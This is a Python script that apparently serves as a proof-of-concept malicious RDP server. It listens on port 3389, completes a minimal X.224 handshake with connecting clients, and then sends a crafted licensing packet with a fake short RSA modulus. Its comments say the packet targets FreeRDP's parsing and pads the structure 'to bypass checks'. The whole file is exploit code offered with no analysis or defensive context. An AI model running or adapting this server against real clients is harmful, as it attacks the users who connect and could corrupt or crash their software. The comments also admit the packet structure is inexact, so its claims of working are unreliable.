import socket
import struct
import threading

HOST = '0.0.0.0'
PORT = 3389

# Fake 64-bit RSA modulus and exponent
FAKE_MODULUS = b'\x11' * 8  # 64-bit
FAKE_EXPONENT = b'\x01\x00\x01'  # 0x10001

def make_license_packet():
    # Fake RDP license packet with crafted modulus and exponent
    # Structure is not exact â€” FreeRDP will parse what it expects
    premaster_tag = b'\x13\x00'  # LICENSE_TAG_PLATFORM_CHALLENGE
    length = 6 + len(FAKE_MODULUS) + len(FAKE_EXPONENT)
    packet = premaster_tag + struct.pack('<H', length)

    # Include fake RSA modulus and exponent
    # Padding fake structure to bypass checks
    packet += b'\x00\x00'  # flags
    packet += struct.pack('<I', len(FAKE_MODULUS))
    packet += FAKE_MODULUS
    packet += struct.pack('<I', len(FAKE_EXPONENT))
    packet += FAKE_EXPONENT
    return packet

def handle_client(conn):
    try:
        print("[+] Client connected")

        # Step 1: Receive connection request (TPKT + X.224)
        data = conn.recv(1024)
        print("[*] Received:", data.hex())

        # Step 2: Send X.224 Connection Confirm + RDP Negotiation Response
        # Minimal handshake response to keep FreeRDP going
        response = bytes.fromhex(
            '0300001300ee000000000100080003000000'  # TPKT+X.224+RDP Negotiation Confirm
        )
        conn.sendall(response)

        # Step 3: Wait for Client MCS request
        data = conn.recv(4096)
        print("[*] MCS Connect Initial:", data.hex())

        # Step 4: Send crafted License packet
        license_data = make_license_packet()

        # Wrap in TPKT header
        tpkt = struct.pack('>BBH', 0x03, 0x00, len(license_data) + 4)
        conn.sendall(tpkt + license_data)
        print("[+] Sent fake License packet")

    except Exception as e:
        print("[-] Error:", e)
    finally:
        conn.close()

def main():
    print(f"[+] Starting fake RDP License server on {HOST}:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        while True:
            conn, _ = s.accept()
            threading.Thread(target=handle_client, args=(conn,)).start()

if __name__ == "__main__":
    main()
